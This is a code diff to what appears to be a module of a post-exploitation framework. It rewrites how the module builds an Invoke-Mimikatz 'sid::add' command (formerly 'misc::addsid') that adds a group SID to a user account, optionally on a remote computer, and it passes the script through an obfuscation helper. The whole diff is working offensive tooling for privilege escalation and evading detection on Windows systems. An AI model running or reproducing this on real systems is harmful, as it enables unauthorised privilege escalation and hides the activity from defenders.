@@ -28,14 +28,13 @@ class Module(object):
 
         script = moduleCode
 
-        # ridiculous escape format
-        groups = " ".join(['"\\""'+group.strip().strip("'\"")+'"""' for group in params["Groups"].split(",")])
-
         # build the custom command with whatever options we want
-        command = '""misc::addsid '+params["User"] + ' ' + groups
-
+        command = f'"sid::add /sam:{params["User"]} /new:{params["Group"]}"'
+        command = f"-Command '{command}'"
+        if params.get("ComputerName"):
+            command = f'{command} -ComputerName "{params["ComputerName"]}"'
         # base64 encode the command to pass to Invoke-Mimikatz
-        scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"';"
+        scriptEnd = f"Invoke-Mimikatz {command};"
 
         if obfuscate:
             scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscation_command)
